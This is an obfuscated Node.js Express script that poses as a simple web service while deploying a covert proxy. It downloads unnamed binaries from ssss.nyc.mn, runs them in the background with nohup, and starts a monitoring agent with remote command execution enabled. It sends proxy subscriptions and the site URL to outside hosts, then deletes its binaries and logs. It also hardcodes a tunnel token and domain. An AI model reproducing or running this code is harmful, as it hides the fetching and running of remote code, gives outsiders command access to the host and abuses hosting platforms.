function _0x284e(){const _0x425f94=['127.0.0.1','\x20>/dev/null\x202>&1\x20&','map','express','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','block','\x20is\x20created','NEZHA_KEY','ARGO_DOMAIN:','chmod','application/json','promises','test','/dev/null','split','arm','del\x20/f\x20/q\x20','firefox','Nodes\x20uploaded\x20successfully','createWriteStream','data','none','\x0a\x20\x20tunnel:\x20','tls','floor','utf8','stringify','pop','Add\x20automatic\x20access\x20task\x20faild:\x20','/config.json\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','amd','&fp=firefox&type=ws&host=','close','ARGO_DOMAIN','22ysBovQ','config.json','push','http','boot.log','https://amd64.ssss.nyc.mn/agent','5225650WrxsBL','https://arm64.ssss.nyc.mn/v1','taskkill\x20/f\x20/im\x20','\x20>/dev/null\x202>&1','1495716MKotnh','Error\x20in\x20startserver:','status','/trojan-argo','2096','env','get','10113030IwLSiQ','stream','blackhole','base64','random','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Error\x20executing\x20command:\x20','country_code','/vmess-argo','unshift','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','http://ip-api.com/json','list.txt','?security=tls&sni=','/tunnel.yml\x20run','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','send','text/plain;\x20charset=utf-8','isFile','SERVER_PORT','TunnelSecret','log','PORT','countryCode','\x20already\x20exists','fileUrl','readFileSync','success','xtls-rprx-vision','vmess','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','has','CFPORT','\x0a\x0atrojan://','1281nTPdYj','arch','\x20successfully','trojan','clear','33lLyOvs','existsSync','axios','freedom','60740knocKw','\x0a\x0avmess://','sub.txt','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','tunnel.yml','3030qjmmpU','abcdefghijklmnopqrstuvwxyz','\x20-s\x20','config.yaml','8443','set','NEZHA_PORT','listen','org','cdns.doon.eu.org','catch','writeFileSync','unlinkSync','rm\x20-rf\x20','response','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','utf-8','direct','tunnel.json','statSync','fileName','pipe','readFile','\x20failed:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20is\x20running','eyJhIjoiNTQ2MmZhZWQ0MGZlZmRjNzdlYmJkYjRiY2I3YjJmMGYiLCJ0IjoiODQxY2JiZDEtNDc1Ni00Nzc5LWJjZWItNTI4MzIwN2NjMzE0IiwicyI6Ik5qRXlOek00WXpBdFl6a3dPUzAwTTJaaExXSTVOemd0WTJFNVkyRmtaREE1TUdSbSJ9','\x0avless://','https://arm64.ssss.nyc.mn/bot','substring','match','index.html','ArgoDomain:','mkdirSync','/vless-argo','\x0a\x20\x20credentials-file:\x20','https+local://8.8.8.8/dns-query','AUTO_ACCESS','ucoffee','/api/add-subscriptions','vless','npm\x20running\x20error:\x20','automatic\x20access\x20task\x20added\x20successfully','8hNUnYJ','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Error\x20downloading\x20files:','NEZHA\x20variable\x20is\x20empty,skip\x20running','UPLOAD_URL','toString','--tls','2087','platform','2053','2083','web\x20running\x20error:\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20-p\x20','from','Skipping\x20adding\x20automatic\x20access\x20task','basename','\x20>\x20nul\x202>&1','&path=%2Ftrojan-argo%3Fed%3D2560#','Download\x20','&path=%2Fvless-argo%3Fed%3D2560#','NEZHA_SERVER','.exe\x20>\x20nul\x202>&1','3934053YLOErj','Galaxy','https://arm64.ssss.nyc.mn/web','quic','233596gevPmE','exec','\x22\x20>\x20/dev/null\x202>&1','\x20-c\x20\x22','php\x20running\x20error:\x20','/vmess-argo?ed=2560','.tmp','18kvhUax','message','true','join','includes','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','length','tcp','App\x20is\x20running','https://amd64.ssss.nyc.mn/bot','nohup\x20','http\x20server\x20is\x20running\x20on\x20port:','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','readdirSync','\x20-c\x20','Error\x20reading\x20boot.log:','forEach','charAt','post','443','error','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','/sub.txt\x20saved\x20successfully','Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!','pkill\x20-f\x20\x22[','filter'];_0x284e=function(){return _0x425f94;};return _0x284e();}const _0x323121=_0x58f8;(function(_0x35f5f8,_0x593572){const _0xd2f10c=_0x58f8,_0x1c9afa=_0x35f5f8();while(!![]){try{const _0x41cb78=-parseInt(_0xd2f10c(0xef))/0x1*(parseInt(_0xd2f10c(0x141))/0x2)+parseInt(_0xd2f10c(0xeb))/0x3*(-parseInt(_0xd2f10c(0x13a))/0x4)+parseInt(_0xd2f10c(0x185))/0x5+parseInt(_0xd2f10c(0xf4))/0x6*(-parseInt(_0xd2f10c(0xe6))/0x7)+-parseInt(_0xd2f10c(0x11f))/0x8*(parseInt(_0xd2f10c(0x136))/0x9)+parseInt(_0xd2f10c(0x190))/0xa+-parseInt(_0xd2f10c(0x17f))/0xb*(-parseInt(_0xd2f10c(0x189))/0xc);if(_0x41cb78===_0x593572)break;else _0x1c9afa['push'](_0x1c9afa['shift']());}catch(_0x104eaf){_0x1c9afa['push'](_0x1c9afa['shift']());}}}(_0x284e,0x8f582));const express=require(_0x323121(0x15f)),app=express(),axios=require(_0x323121(0xed)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require('child_process')[_0x323121(0x13b)]),UPLOAD_URL=process[_0x323121(0x18e)][_0x323121(0x123)]||'',PROJECT_URL=process[_0x323121(0x18e)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x323121(0x18e)][_0x323121(0x119)]||![],FILE_PATH=process[_0x323121(0x18e)]['FILE_PATH']||_0x323121(0x140),SUB_PATH=process['env']['SUB_PATH']||_0x323121(0x11a),PORT=process['env'][_0x323121(0xd7)]||process[_0x323121(0x18e)][_0x323121(0xda)]||0xbb8,UUID=process[_0x323121(0x18e)]['UUID']||'85a5ecc1-c50c-4198-9d09-3adbd22b769b',NEZHA_SERVER=process[_0x323121(0x18e)][_0x323121(0x134)]||'',NEZHA_PORT=process['env'][_0x323121(0xfa)]||'',NEZHA_KEY=process['env'][_0x323121(0x163)]||'',ARGO_DOMAIN=process[_0x323121(0x18e)][_0x323121(0x17e)]||'galaxy-us-01.780202.xyz',ARGO_AUTH=process[_0x323121(0x18e)][_0x323121(0x17a)]||_0x323121(0x10e),ARGO_PORT=process[_0x323121(0x18e)]['ARGO_PORT']||0x1f41,CFIP=process['env']['CFIP']||_0x323121(0xfd),CFPORT=process[_0x323121(0x18e)][_0x323121(0xe4)]||0x1bb,NAME=process['env']['NAME']||_0x323121(0x137);!fs['existsSync'](FILE_PATH)?(fs[_0x323121(0x115)](FILE_PATH),console['log'](FILE_PATH+_0x323121(0x162))):console[_0x323121(0xd9)](FILE_PATH+_0x323121(0xdc));function generateRandomName(){const _0x44ab71=_0x323121,_0x4f3162=_0x44ab71(0xf5);let _0x530e9d='';for(let _0x1252dd=0x0;_0x1252dd<0x6;_0x1252dd++){_0x530e9d+=_0x4f3162[_0x44ab71(0x153)](Math[_0x44ab71(0x174)](Math[_0x44ab71(0x194)]()*_0x4f3162[_0x44ab71(0x147)]));}return _0x530e9d;}function _0x58f8(_0x475a92,_0x3f17b6){_0x475a92=_0x475a92-0xd5;const _0x284ee5=_0x284e();let _0x58f814=_0x284ee5[_0x475a92];return _0x58f814;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x323121(0x144)](FILE_PATH,npmName),phpPath=path[_0x323121(0x144)](FILE_PATH,phpName),webPath=path[_0x323121(0x144)](FILE_PATH,webName),botPath=path[_0x323121(0x144)](FILE_PATH,botName),subPath=path[_0x323121(0x144)](FILE_PATH,_0x323121(0xf1)),listPath=path[_0x323121(0x144)](FILE_PATH,_0x323121(0x19c)),bootLogPath=path[_0x323121(0x144)](FILE_PATH,_0x323121(0x183)),configPath=path['join'](FILE_PATH,_0x323121(0x180));function deleteNodes(){const _0x4cf20f=_0x323121;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x1b9dfc;try{_0x1b9dfc=fs[_0x4cf20f(0xde)](subPath,_0x4cf20f(0x104));}catch{return null;}const _0x3e3871=Buffer[_0x4cf20f(0x12d)](_0x1b9dfc,'base64')[_0x4cf20f(0x124)](_0x4cf20f(0x104)),_0x3f2797=_0x3e3871[_0x4cf20f(0x16a)]('\x0a')[_0x4cf20f(0x15b)](_0x4ce307=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4cf20f(0x168)](_0x4ce307));if(_0x3f2797[_0x4cf20f(0x147)]===0x0)return;return axios[_0x4cf20f(0x154)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x4cf20f(0x176)]({'nodes':_0x3f2797}),{'headers':{'Content-Type':_0x4cf20f(0x166)}})[_0x4cf20f(0xfe)](_0x57f009=>{return null;}),null;}catch(_0x100492){return null;}}function cleanupOldFiles(){const _0x3717fd=_0x323121;try{const _0x426587=fs[_0x3717fd(0x14f)](FILE_PATH);_0x426587[_0x3717fd(0x152)](_0x576f52=>{const _0x119481=_0x3717fd,_0x68c692=path['join'](FILE_PATH,_0x576f52);try{const _0x20f650=fs[_0x119481(0x107)](_0x68c692);_0x20f650[_0x119481(0xd6)]()&&fs[_0x119481(0x100)](_0x68c692);}catch(_0x9c1dc1){}});}catch(_0x30b469){}}async function generateConfig(){const _0x330720=_0x323121,_0x149fe1={'log':{'access':_0x330720(0x169),'error':_0x330720(0x169),'loglevel':_0x330720(0x171)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x330720(0x11c),'settings':{'clients':[{'id':UUID,'flow':_0x330720(0xe0)}],'decryption':_0x330720(0x171),'fallbacks':[{'dest':0xbb9},{'path':_0x330720(0x116),'dest':0xbba},{'path':_0x330720(0x198),'dest':0xbbb},{'path':_0x330720(0x18c),'dest':0xbbc}]},'streamSettings':{'network':_0x330720(0x148)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x330720(0x171)},'streamSettings':{'network':_0x330720(0x148),'security':_0x330720(0x171)}},{'port':0xbba,'listen':_0x330720(0x15c),'protocol':_0x330720(0x11c),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x330720(0x173),_0x330720(0x139)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x330720(0x15c),'protocol':_0x330720(0xe1),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x330720(0x198)}},'sniffing':{'enabled':!![],'destOverride':[_0x330720(0x182),_0x330720(0x173),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x330720(0x15c),'protocol':_0x330720(0xe9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x330720(0x18c)}},'sniffing':{'enabled':!![],'destOverride':[_0x330720(0x182),_0x330720(0x173),_0x330720(0x139)],'metadataOnly':![]}}],'dns':{'servers':[_0x330720(0x118)]},'outbounds':[{'protocol':_0x330720(0xee),'tag':_0x330720(0x105)},{'protocol':_0x330720(0x192),'tag':_0x330720(0x161)}]};fs['writeFileSync'](path[_0x330720(0x144)](FILE_PATH,'config.json'),JSON['stringify'](_0x149fe1,null,0x2));}function getSystemArchitecture(){const _0x5b0b46=_0x323121,_0x3bdc9c=os[_0x5b0b46(0xe7)]();return _0x3bdc9c==='arm'||_0x3bdc9c==='arm64'||_0x3bdc9c==='aarch64'?_0x5b0b46(0x16b):_0x5b0b46(0x17b);}function downloadFile(_0x3d0c5b,_0x3f886f,_0x15e667){const _0x244f38=_0x323121,_0x195472=_0x3d0c5b;!fs[_0x244f38(0xec)](FILE_PATH)&&fs[_0x244f38(0x115)](FILE_PATH,{'recursive':!![]});const _0x440805=fs[_0x244f38(0x16f)](_0x195472);axios({'method':_0x244f38(0x18f),'url':_0x3f886f,'responseType':_0x244f38(0x191)})['then'](_0x4cae21=>{const _0x132538=_0x244f38;_0x4cae21[_0x132538(0x170)][_0x132538(0x109)](_0x440805),_0x440805['on']('finish',()=>{const _0x5769fe=_0x132538;_0x440805[_0x5769fe(0x17d)](),console['log'](_0x5769fe(0x132)+path['basename'](_0x195472)+_0x5769fe(0xe8)),_0x15e667(null,_0x195472);}),_0x440805['on'](_0x132538(0x156),_0x5f35e2=>{const _0x14c668=_0x132538;fs['unlink'](_0x195472,()=>{});const _0x2d66f1=_0x14c668(0x132)+path[_0x14c668(0x12f)](_0x195472)+'\x20failed:\x20'+_0x5f35e2[_0x14c668(0x142)];console['error'](_0x2d66f1),_0x15e667(_0x2d66f1);});})['catch'](_0x5788a4=>{const _0x3d0f11=_0x244f38,_0x1a096e=_0x3d0f11(0x132)+path[_0x3d0f11(0x12f)](_0x195472)+_0x3d0f11(0x10b)+_0x5788a4[_0x3d0f11(0x142)];console[_0x3d0f11(0x156)](_0x1a096e),_0x15e667(_0x1a096e);});}async function downloadFilesAndRun(){const _0x57133b=_0x323121,_0x21737b=getSystemArchitecture(),_0x1f388d=getFilesForArchitecture(_0x21737b);if(_0x1f388d[_0x57133b(0x147)]===0x0){console[_0x57133b(0xd9)](_0x57133b(0x120));return;}const _0x28bce4=_0x1f388d[_0x57133b(0x15e)](_0x5e1938=>{return new Promise((_0x8e9d2a,_0x250b54)=>{const _0x5e4dd4=_0x58f8;downloadFile(_0x5e1938[_0x5e4dd4(0x108)],_0x5e1938[_0x5e4dd4(0xdd)],(_0x965eb6,_0xfae0f8)=>{_0x965eb6?_0x250b54(_0x965eb6):_0x8e9d2a(_0xfae0f8);});});});try{await Promise['all'](_0x28bce4);}catch(_0x4d51d3){console[_0x57133b(0x156)](_0x57133b(0x121),_0x4d51d3);return;}function _0x10e707(_0x409cc2){const _0x17fb6a=_0x57133b,_0x50a739=0x1fd;_0x409cc2[_0x17fb6a(0x152)](_0x4886bf=>{const _0x4f3e8e=_0x17fb6a;fs[_0x4f3e8e(0xec)](_0x4886bf)&&fs[_0x4f3e8e(0x165)](_0x4886bf,_0x50a739,_0x12cf73=>{const _0x4f747e=_0x4f3e8e;_0x12cf73?console['error']('Empowerment\x20failed\x20for\x20'+_0x4886bf+':\x20'+_0x12cf73):console[_0x4f747e(0xd9)]('Empowerment\x20success\x20for\x20'+_0x4886bf+':\x20'+_0x50a739[_0x4f747e(0x124)](0x8));});});}const _0x21601e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x10e707(_0x21601e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3c0d4d=NEZHA_SERVER[_0x57133b(0x145)](':')?NEZHA_SERVER[_0x57133b(0x16a)](':')[_0x57133b(0x177)]():'',_0x14a64c=new Set([_0x57133b(0x155),'8443',_0x57133b(0x18d),_0x57133b(0x126),_0x57133b(0x129),_0x57133b(0x128)]),_0x4b3ea6=_0x14a64c[_0x57133b(0xe3)](_0x3c0d4d)?_0x57133b(0x143):'false',_0x330b90='\x0aclient_secret:\x20'+NEZHA_KEY+_0x57133b(0x195)+NEZHA_SERVER+_0x57133b(0x14e)+_0x4b3ea6+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x57133b(0xff)](path[_0x57133b(0x144)](FILE_PATH,_0x57133b(0xf7)),_0x330b90);const _0x463c12=_0x57133b(0x14b)+phpPath+_0x57133b(0x13d)+FILE_PATH+_0x57133b(0x103);try{await exec(_0x463c12),console[_0x57133b(0xd9)](phpName+_0x57133b(0x10d)),await new Promise(_0x5db204=>setTimeout(_0x5db204,0x3e8));}catch(_0x37aae7){console['error'](_0x57133b(0x13e)+_0x37aae7);}}else{let _0x3dbcdf='';const _0x5468fe=['443',_0x57133b(0xf8),_0x57133b(0x18d),'2087',_0x57133b(0x129),'2053'];_0x5468fe[_0x57133b(0x145)](NEZHA_PORT)&&(_0x3dbcdf=_0x57133b(0x125));const _0x5d72aa=_0x57133b(0x14b)+npmPath+_0x57133b(0xf6)+NEZHA_SERVER+':'+NEZHA_PORT+_0x57133b(0x12c)+NEZHA_KEY+'\x20'+_0x3dbcdf+_0x57133b(0x10c);try{await exec(_0x5d72aa),console[_0x57133b(0xd9)](npmName+'\x20is\x20running'),await new Promise(_0xd0f607=>setTimeout(_0xd0f607,0x3e8));}catch(_0xf2b735){console['error'](_0x57133b(0x11d)+_0xf2b735);}}}else console[_0x57133b(0xd9)](_0x57133b(0x122));const _0x4aee61=_0x57133b(0x14b)+webPath+_0x57133b(0x150)+FILE_PATH+_0x57133b(0x179);try{await exec(_0x4aee61),console[_0x57133b(0xd9)](webName+_0x57133b(0x10d)),await new Promise(_0x42dc69=>setTimeout(_0x42dc69,0x3e8));}catch(_0x55f16b){console['error'](_0x57133b(0x12a)+_0x55f16b);}if(fs['existsSync'](botPath)){let _0x46c2a9;if(ARGO_AUTH[_0x57133b(0x112)](/^[A-Z0-9a-z=]{120,250}$/))_0x46c2a9=_0x57133b(0x19f)+ARGO_AUTH;else ARGO_AUTH[_0x57133b(0x112)](/TunnelSecret/)?_0x46c2a9=_0x57133b(0xf2)+FILE_PATH+_0x57133b(0x19e):_0x46c2a9=_0x57133b(0x160)+FILE_PATH+_0x57133b(0xe2)+ARGO_PORT;try{await exec(_0x57133b(0x14b)+botPath+'\x20'+_0x46c2a9+_0x57133b(0x15d)),console[_0x57133b(0xd9)](botName+_0x57133b(0x10d)),await new Promise(_0x59bda5=>setTimeout(_0x59bda5,0x7d0));}catch(_0x42840d){console['error'](_0x57133b(0x196)+_0x42840d);}}await new Promise(_0x4ef9a9=>setTimeout(_0x4ef9a9,0x1388));}function getFilesForArchitecture(_0x309f1d){const _0x572dc2=_0x323121;let _0x1aefb8;_0x309f1d===_0x572dc2(0x16b)?_0x1aefb8=[{'fileName':webPath,'fileUrl':_0x572dc2(0x138)},{'fileName':botPath,'fileUrl':_0x572dc2(0x110)}]:_0x1aefb8=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x572dc2(0x14a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x508d10=_0x309f1d===_0x572dc2(0x16b)?'https://arm64.ssss.nyc.mn/agent':_0x572dc2(0x184);_0x1aefb8[_0x572dc2(0x199)]({'fileName':npmPath,'fileUrl':_0x508d10});}else{const _0x41efe3=_0x309f1d===_0x572dc2(0x16b)?_0x572dc2(0x186):'https://amd64.ssss.nyc.mn/v1';_0x1aefb8[_0x572dc2(0x199)]({'fileName':phpPath,'fileUrl':_0x41efe3});}}return _0x1aefb8;}function argoType(){const _0x1ea46e=_0x323121;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ea46e(0xd9)](_0x1ea46e(0x12b));return;}if(ARGO_AUTH['includes'](_0x1ea46e(0xd8))){fs[_0x1ea46e(0xff)](path['join'](FILE_PATH,_0x1ea46e(0x106)),ARGO_AUTH);const _0x145d2c=_0x1ea46e(0x172)+ARGO_AUTH[_0x1ea46e(0x16a)]('\x22')[0xb]+_0x1ea46e(0x117)+path[_0x1ea46e(0x144)](FILE_PATH,'tunnel.json')+_0x1ea46e(0x19a)+ARGO_DOMAIN+_0x1ea46e(0x157)+ARGO_PORT+_0x1ea46e(0x146);fs[_0x1ea46e(0xff)](path[_0x1ea46e(0x144)](FILE_PATH,_0x1ea46e(0xf3)),_0x145d2c);}else console[_0x1ea46e(0xd9)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x67147=_0x323121;let _0x47999b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x47999b=ARGO_DOMAIN,console['log'](_0x67147(0x164),_0x47999b),await _0x46a178(_0x47999b);else try{const _0x302c0f=fs[_0x67147(0xde)](path[_0x67147(0x144)](FILE_PATH,'boot.log'),_0x67147(0x104)),_0x5c1dac=_0x302c0f['split']('\x0a'),_0x37fd88=[];_0x5c1dac[_0x67147(0x152)](_0x4a3f8e=>{const _0x5cde37=_0x67147,_0x4892be=_0x4a3f8e[_0x5cde37(0x112)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4892be){const _0x1338ba=_0x4892be[0x1];_0x37fd88[_0x5cde37(0x181)](_0x1338ba);}});if(_0x37fd88[_0x67147(0x147)]>0x0)_0x47999b=_0x37fd88[0x0],console['log'](_0x67147(0x114),_0x47999b),await _0x46a178(_0x47999b);else{console[_0x67147(0xd9)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x67147(0x100)](path[_0x67147(0x144)](FILE_PATH,_0x67147(0x183)));async function _0x149923(){const _0x158bb0=_0x67147;try{process['platform']==='win32'?await exec(_0x158bb0(0x187)+botName+_0x158bb0(0x135)):await exec(_0x158bb0(0x15a)+botName[_0x158bb0(0x153)](0x0)+']'+botName[_0x158bb0(0x111)](0x1)+_0x158bb0(0x13c));}catch(_0x2d378d){}}_0x149923(),await new Promise(_0x28c806=>setTimeout(_0x28c806,0xbb8));const _0x33ea5e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x67147(0xe2)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x33ea5e+'\x20>/dev/null\x202>&1\x20&'),console[_0x67147(0xd9)](botName+_0x67147(0x10d)),await new Promise(_0x540097=>setTimeout(_0x540097,0xbb8)),await extractDomains();}catch(_0x56d64f){console['error'](_0x67147(0x196)+_0x56d64f);}}}catch(_0x3e8f04){console['error'](_0x67147(0x151),_0x3e8f04);}async function _0x32a814(){const _0x4066fd=_0x67147;try{const _0x52853f=await axios[_0x4066fd(0x18f)]('https://ipapi.co/json',{'timeout':0xbb8});if(_0x52853f[_0x4066fd(0x170)]&&_0x52853f[_0x4066fd(0x170)][_0x4066fd(0x197)]&&_0x52853f['data']['org'])return _0x52853f[_0x4066fd(0x170)][_0x4066fd(0x197)]+'_'+_0x52853f['data']['org'];}catch(_0x449507){try{const _0x4dbc9e=await axios[_0x4066fd(0x18f)](_0x4066fd(0x19b),{'timeout':0xbb8});if(_0x4dbc9e[_0x4066fd(0x170)]&&_0x4dbc9e['data'][_0x4066fd(0x18b)]===_0x4066fd(0xdf)&&_0x4dbc9e[_0x4066fd(0x170)][_0x4066fd(0xdb)]&&_0x4dbc9e[_0x4066fd(0x170)]['org'])return _0x4dbc9e[_0x4066fd(0x170)][_0x4066fd(0xdb)]+'_'+_0x4dbc9e[_0x4066fd(0x170)][_0x4066fd(0xfc)];}catch(_0x47abb2){}}return'Unknown';}async function _0x46a178(_0x289ca3){const _0x5a3e05=await _0x32a814(),_0xbb3f6f=NAME?NAME+'-'+_0x5a3e05:_0x5a3e05;return new Promise(_0x50a90f=>{setTimeout(()=>{const _0x1bd78b=_0x58f8,_0x2ec2f3={'v':'2','ps':''+_0xbb3f6f,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x1bd78b(0x171),'net':'ws','type':'none','host':_0x289ca3,'path':_0x1bd78b(0x13f),'tls':'tls','sni':_0x289ca3,'alpn':'','fp':_0x1bd78b(0x16d)},_0x541227=_0x1bd78b(0x10f)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x289ca3+_0x1bd78b(0x17c)+_0x289ca3+_0x1bd78b(0x133)+_0xbb3f6f+_0x1bd78b(0xf0)+Buffer['from'](JSON[_0x1bd78b(0x176)](_0x2ec2f3))[_0x1bd78b(0x124)](_0x1bd78b(0x193))+_0x1bd78b(0xe5)+UUID+'@'+CFIP+':'+CFPORT+_0x1bd78b(0x19d)+_0x289ca3+_0x1bd78b(0x17c)+_0x289ca3+_0x1bd78b(0x131)+_0xbb3f6f+'\x0a\x20\x20\x20\x20';console[_0x1bd78b(0xd9)](Buffer[_0x1bd78b(0x12d)](_0x541227)[_0x1bd78b(0x124)]('base64')),fs[_0x1bd78b(0xff)](subPath,Buffer[_0x1bd78b(0x12d)](_0x541227)[_0x1bd78b(0x124)]('base64')),console[_0x1bd78b(0xd9)](FILE_PATH+_0x1bd78b(0x158)),uploadNodes(),app[_0x1bd78b(0x18f)]('/'+SUB_PATH,(_0x4af3ef,_0x818019)=>{const _0x2d6ff1=_0x1bd78b,_0x55b7f0=Buffer[_0x2d6ff1(0x12d)](_0x541227)[_0x2d6ff1(0x124)](_0x2d6ff1(0x193));_0x818019[_0x2d6ff1(0xf9)]('Content-Type',_0x2d6ff1(0xd5)),_0x818019['send'](_0x55b7f0);}),_0x50a90f(_0x541227);},0x7d0);});}}async function uploadNodes(){const _0x108896=_0x323121;if(UPLOAD_URL&&PROJECT_URL){const _0x90542d=PROJECT_URL+'/'+SUB_PATH,_0x58fc3e={'subscription':[_0x90542d]};try{const _0x2975d8=await axios[_0x108896(0x154)](UPLOAD_URL+_0x108896(0x11b),_0x58fc3e,{'headers':{'Content-Type':_0x108896(0x166)}});return _0x2975d8&&_0x2975d8['status']===0xc8?(console[_0x108896(0xd9)]('Subscription\x20uploaded\x20successfully'),_0x2975d8):null;}catch(_0x383905){if(_0x383905[_0x108896(0x102)]){if(_0x383905[_0x108896(0x102)][_0x108896(0x18b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x26db35=fs[_0x108896(0xde)](listPath,_0x108896(0x104)),_0x4a3e08=_0x26db35[_0x108896(0x16a)]('\x0a')[_0x108896(0x15b)](_0x3ad328=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x108896(0x168)](_0x3ad328));if(_0x4a3e08['length']===0x0)return;const _0x5b5815=JSON[_0x108896(0x176)]({'nodes':_0x4a3e08});try{const _0x2fe55d=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x5b5815,{'headers':{'Content-Type':'application/json'}});return _0x2fe55d&&_0x2fe55d['status']===0xc8?(console['log'](_0x108896(0x16e)),_0x2fe55d):null;}catch(_0x1072a0){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x454a90=_0x58f8,_0x4ee280=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4ee280['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4ee280[_0x454a90(0x181)](phpPath);process[_0x454a90(0x127)]==='win32'?exec(_0x454a90(0x16c)+_0x4ee280['join']('\x20')+_0x454a90(0x130),_0xe723f3=>{const _0x31018e=_0x454a90;console[_0x31018e(0xea)](),console['log']('App\x20is\x20running'),console['log'](_0x31018e(0x14d));}):exec(_0x454a90(0x101)+_0x4ee280[_0x454a90(0x144)]('\x20')+_0x454a90(0x188),_0x147d5c=>{const _0x45e2ba=_0x454a90;console[_0x45e2ba(0xea)](),console[_0x45e2ba(0xd9)](_0x45e2ba(0x149)),console[_0x45e2ba(0xd9)](_0x45e2ba(0x14d));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2b6a37=_0x323121;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2b6a37(0xd9)](_0x2b6a37(0x12e));return;}try{const _0x2b8d8a=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2b6a37(0x166)}});return console['log'](_0x2b6a37(0x11e)),_0x2b8d8a;}catch(_0x3b39c1){return console[_0x2b6a37(0x156)](_0x2b6a37(0x178)+_0x3b39c1[_0x2b6a37(0x142)]),null;}}async function startserver(){const _0x403a3e=_0x323121;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x299919){console[_0x403a3e(0x156)](_0x403a3e(0x18a),_0x299919);}}startserver()[_0x323121(0xfe)](_0x474360=>{const _0x586bd0=_0x323121;console[_0x586bd0(0x156)]('Unhandled\x20error\x20in\x20startserver:',_0x474360);}),app[_0x323121(0x18f)]('/',async function(_0x8ed5,_0x2be2a7){const _0x3180ca=_0x323121;try{const _0x4725e5=path[_0x3180ca(0x144)](__dirname,_0x3180ca(0x113)),_0x217af9=await fs[_0x3180ca(0x167)][_0x3180ca(0x10a)](_0x4725e5,_0x3180ca(0x175));_0x2be2a7[_0x3180ca(0x1a0)](_0x217af9);}catch(_0x1ee725){_0x2be2a7[_0x3180ca(0x1a0)](_0x3180ca(0x159));}}),app[_0x323121(0xfb)](PORT,()=>console[_0x323121(0xd9)](_0x323121(0x14c)+PORT+'!'));
